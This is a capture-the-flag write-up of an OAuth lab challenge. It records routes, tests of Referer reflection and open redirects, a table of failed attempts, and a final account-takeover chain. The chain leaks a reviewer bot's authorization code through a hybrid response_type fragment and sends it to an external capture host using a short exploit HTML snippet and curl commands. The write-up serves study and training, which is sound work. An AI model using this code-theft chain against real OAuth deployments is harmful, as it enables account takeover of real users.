# Solo Leveling: Referer Gate (sl4) — lab notes

Date: 2026-07-11  
Status: **unsolved** (lab time expired; flag not captured)  
Bug class: OAuth Referer trust on missing-code callback, multi-account state binding, Sec-Fetch-Dest split, reviewer bot abuse

## Targets tested

| Instance ID | App host | Status |
|-------------|----------|--------|
| `948ec6f14eb4` | `solo-leveling-referer-948ec6f14eb4.pwnbox-lab.com` | Expired mid-run |
| `90c6766a15b1` | `solo-leveling-referer-90c6766a15b1.pwnbox-lab.com` | Active during run; keeper portrait hits observed |
| `ed30ab23e109` | `solo-leveling-referer-ed30ab23e109.pwnbox-lab.com` | Primary session; flag not captured |

Google IdP pattern: `https://google-<instance>.pwnbox-lab.com/`  
Default creds: `pwnu` / `pwnp`  
`client_id`: `solo-leveling-4-client`

## Observation

- Routes confirmed: `/`, `/profile`, `/callback`, `/report`, `/logout` only
- **No** `/auth`, `/init`, `/error`, `/logger` (unlike sl1–sl3)
- Session cookie: `connect.sid` (HttpOnly, SameSite=Lax) — set only after successful callback exchange when redirects are followed on first login
- Homepage embeds **32-char hex** OAuth `state` in Google link (not base64 JSON like sl1)
- Quest hints: multi-account gate; bind as pwnu; leak reviewer OAuth code via Referer; Referer-exchange to claim Statue identity
- Flag target: `/profile` as **Statue of God** (`pwnbox{...}`)

## Confirmed mechanics

### 1. Missing-code Referer trust (core primitive)

```http
GET /callback?state=<Sa>          (no code= parameter)
Referer: https://<app>/callback?code=<X>&state=<Sa>
→ 302 Location: <full Referer URL echoed, including code=>
```

Also works:

- Bare `GET /callback` (no query) + forged Referer → reflects Referer in `Location`
- **Open redirect confirmed:** external Referer (e.g. `https://example.com/x?code=...`) reflected without validation
- Referer fuzz: empty `code=` (`callback?code=&state=Sa`), reordered query params, fragment-only (`callback#CODE`), userinfo confusion (`https://evil.com@app/callback?code=...`) — all echoed in `Location`

### 2. Referer-only code exchange (attacker session)

With saved `connect.sid`:

```bash
curl -sS -b cookies.txt \
  -H "Referer: $SL/callback?code=$CODE&state=$Sa" \
  -L "$SL/callback?state=$Sa"
curl -sS -b cookies.txt "$SL/profile"
```

- Works for attacker-issued codes from Google IdP (`pwnu` login or local `prompt=none`)
- Result with pwnu codes: profile **Sung Jinwoo** — **not** Statue / flag
- Locally minted `prompt=none` codes without bot session also map to Sung Jinwoo

### 3. State bind workflow (“Cross the Threshold”)

1. `GET /` → read `Sa0` from homepage OAuth link
2. Complete pwnu OAuth with `Sa0`; **follow redirects** → `connect.sid` set
3. `GET /` while logged in → fresh unspent `Sa`
4. Do **not** spend `Sa` on attacker OAuth before bot run

If first OAuth redirect is not followed, `connect.sid` is never set and Referer exchange fails silently.

### 4. Sec-Fetch-Dest / cookie split on `/callback?code=&state=`

Tested with pwnu-issued code while `Sa` is bound to attacker session:

| Request context | Cookies | Result |
|-----------------|---------|--------|
| document, anon | none | `302 /profile` (code consumed by ephemeral bot-like session) |
| iframe, anon | none | `400` ~1831b HTML — “Invalid state parameter.” — **no `<img>` tags** |
| document, logged-in pwnu | `connect.sid` | `400` “Invalid state parameter.” |
| iframe, logged-in pwnu | `connect.sid` | `302 /profile` (Sung Jinwoo) |

**Likely intent:** reviewer bot must land in **iframe** context with bound `Sa` + reviewer code to reach a multi-account conflict page (not tested with real reviewer code locally).

### 5. pwnu portrait Referer policy

Profile page portrait:

```html
<img ... referrerpolicy="no-referrer" src="https://static.wikia.nocookie.net/.../Jinwoo4.jpg">
```

Hypothesis (unconfirmed on this instance): Statue / reviewer portrait on multi-account callback may load from `https://l30on.top/k/reviewer-avatar` **without** `no-referrer`.

### 6. Google IdP limits

- Only `pwnu` / `pwnp` creds work for manual login; no reviewer creds found
- `redirect_uri` fuzz: only exact `/callback` accepted; `/callback/`, `/callback#`, OAST host, lab-suffix subkeeper, userinfo tricks → **400**
- `POST /callback` → **404** (exchange is GET-only)
- `POST /token` returns `401` without valid `client_secret`; quick dictionary brute — no hit
- Hybrid `response_type=code token|token|code id_token` + `prompt=none` → `/callback#code=...&access_token=...`; server GET without hash → 302 `/`; hybrid Referer exchange → Sung Jinwoo; `access_token` as fake Referer `code` → Sung Jinwoo
- `GET /profile` with callback Referer — no identity change / no flag

### 7. Bot evidence

**Instance `90c6766a15b1` (keeper logs ~2026-07-11T02:25:37Z):** HeadlessChrome simultaneously requested:

- `/k/reviewer-avatar`
- `/k/reviewer`
- `/k/statue-avatar`
- `/k/statue`

Supports multi-account conflict page loading multiple portrait sinks.

**Instance `ed30ab23e109`:** HeadlessChrome **did** visit hosted exploit pages (e.g. `sl4ref76120.l30on.top`) — OAST beacons showed exploit-host Referer only, **no** `code=` in Referer. **No new** HeadlessChrome keeper hits during this instance’s report runs.

## Hypothesized full chain (unconfirmed — flag not obtained)

1. Attacker logs in as pwnu → binds fresh `Sa` on logged-in `GET /`
2. Reviewer bot visits `prompt=none` OAuth URL with same `Sa` → reviewer authorization code `R`
3. Exfil `R` via one of:
   - **Portrait Referer:** multi-account iframe callback loads Statue portrait from keeper path without `no-referrer`
   - **Referer reflect chain:** iframe oauth → iframe `callback?state=Sa` (Referer = prior `callback?code=R&state=Sa`) → server reflects → navigate to OAST or subkeeper capture page reading `document.referrer`
4. Attacker Referer-exchange on own `connect.sid` with stolen `R` → Statue of God + flag on `/profile`

**Blocker:** reviewer code `R` never captured on `ed30ab23e109` despite multiple bot visits to hosted exploit pages.

## Failed attempts

| Approach | Result |
|----------|--------|
| Direct OAuth URL `POST /report` + OAST poll | Bot never sent `code=` in OAST Referer |
| Subkeeper iframe: oauth → delayed `callback?state=Sa` (4–15s) | Exploit page visited; no code |
| Iframe oauth → `callback?state=Sa` @12s → OAST iframe @15s | No code in OAST (`sl4leak4545`) |
| Subkeeper `document.referrer` capture page as iframe target | Interrupted; no confirmed steal |
| Lab suffix subkeeper `solo-leveling-referer-<id>.pwnbox-lab.com.l30on.top` | Bot hit page; no code leak |
| Keeper `redirect_url` → OAST | Keeper returns 200, not 302 |
| Dual iframe (oauth + callback?state=Sa) | No code captured |
| Single iframe oauth only (`sl4only7669`) | No code; keeper logs only stale ~02:25Z portrait hits |
| Hybrid oauth bot exploit (`sl4hyb*`, direct + iframe report) | No steal after ~2 min |
| Iframe → `callback?state=Sa` @12s → OAST @15s (`sl4leak4545`) | No `code=` in OAST after ~147s |
| Multi-report parallel (anon bind, dual iframe, direct oauth, meta refresh — task 233695) | 3 min poll — **FINAL FLAG NONE** |
| Top-level meta refresh oauth chain | No steal |
| `access_token` substituted as Referer `code` | Sung Jinwoo only |
| Open redirect Referer fuzz | Works for attacker-forged Referer only |
| Referer exchange with local `prompt=none` codes | Always Sung Jinwoo |
| Multiple `/report` submissions in one session | Possibly confuses bot / rate limits — avoid |

## Infrastructure used

- L30 Tools API (`L30_TOOLS_API_BASE`, `L30_TOOLS_API_TOKEN` from `.env`)
- OAST sessions for callback Referer capture
- Subkeeper exploit hosts on `*.l30on.top`
- Keeper sink paths referenced by lab: `/k/reviewer-avatar`, `/k/reviewer`, `/k/statue`, `/k/statue-avatar`
- Keeper logs API does **not** expose Referer headers in log entries — capture must use OAST or client-side `document.referrer` beacon

## Failed assumptions

- sl1 DOMPurify `/error` path — **not present** on sl4
- sl2 OAuth CSRF `/auth` staged code — **no `/auth` route**
- sl3 hybrid `/logger` postMessage — **no `/logger` route**
- `prompt=none` without bot session yields reviewer code — **returns pwnu-like identity**
- OAST direct iframe navigation always leaks query-string Referer — **only exploit-host Referer observed**
- First OAuth without `-L` / redirect follow sets session — **connect.sid missing**

## Confirmed solution — instance `38b794f40a24` (2026-07-12)

**Root cause alignment:** [Voorivex OAuth Non-Happy Path to ATO](https://blog.voorivex.team/oauth-non-happy-path-to-ato) — hybrid `response_type` puts `code` in URL **fragment** on non-happy callback path; client-side redirect strips fragment on server 302 but hybrid lands on attacker origin with `#code=...`.

### Working chain

1. Attacker logs in as `pwnu`/`pwnp` via Google OAuth (follow redirects for `connect.sid`).
2. `GET /` while logged in → bind fresh `Sa` (do not spend).
3. Host subkeeper page that **`window.open`s** Google OAuth with:
   - `response_type=code+token` (or `code token` / `id_token,code`)
   - `prompt=none`
   - same `state=Sa`
4. `POST /report` with exploit URL. Reviewer bot opens popup → OAuth → `/callback#code=R&access_token=...`.
5. Non-happy path **client-redirects popup back to opener** (`sl4vx*.l30on.top`) with fragment intact.
6. Exploit page beacons `location.hash` to OAST → steal reviewer `code=R`.
7. Attacker **Arise:** `GET /callback?state=Sa` with header `Referer: {SL}/callback?code=R&state=Sa` → follow redirect → `/profile` as **Statue of God**.

### Evidence

- OAST hit (HeadlessChrome): `#code=vtYGTHTQUh_Aif4A2TN5-eOB4li2UJX_Kneurzo-OK4&access_token=...&state=809f7533fc181649747a020a58bb4394|ref=https://sl4vx979013.l30on.top/`
- Profile after Referer exchange: **Statue of God**
- **Flag:** `pwnbox{ec2c5f9d601ba177f6d4b0b5f720d4fb}`

### Why prior attempts failed

- **Iframe + manual `w.location` to callback** — cross-origin blocked; Referer stayed exploit host.
- **Aggressive polling `callback?state=Sa`** — may overwrite/clear staged referer; always `Location: /`.
- **`response_type=code` only** — happy path consumes code server-side; no fragment leak to opener.
- **`document.referrer` capture via iframe navigation** — parent-initiated iframe nav does not preserve OAuth callback as referrer.

### Minimal exploit HTML

```html
<script>
function leak(d){ new Image().src="https://OAST/cap?d="+encodeURIComponent(d); }
function check(){
  var h=location.hash||"";
  if (h.indexOf("code=")>=0) leak(h+"|ref="+document.referrer);
}
check(); setInterval(check, 300);
window.open("GOOGLE_OAUTH?response_type=code+token&prompt=none&state=Sa...", "", "width=1,height=1");
</script>
```

## Flag

**Captured:** `pwnbox{ec2c5f9d601ba177f6d4b0b5f720d4fb}` (instance `38b794f40a24`)
